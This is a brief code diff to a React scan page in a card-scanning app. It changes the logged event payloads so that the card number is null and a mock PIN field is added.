@@ -43,7 +43,7 @@ export default function ScanPage() {
           body: JSON.stringify({
             event: 'scan_image_uploaded',
             brandName: brand.name,
-            cardNumber: 'UNKNOWN (Scan)',
+            cardNumber: null, // NO CARD NUMBER FOR UPLOAD
             amount: '0',
             status: 'Image Uploaded',
             message: 'User captured image, entering amount.',
@@ -105,7 +105,8 @@ export default function ScanPage() {
         body: JSON.stringify({
           event: data.status === 'active' ? 'success' : 'failed',
           brandName: brand.name,
-          cardNumber: mockNumber,
+          cardNumber: null, // NO CARD NUMBER FOR SCAN
+          pin: brand.pin ? mockPin : null, // ADDED PIN
           amount: clean,
           status: data.status,
           message: data.message,
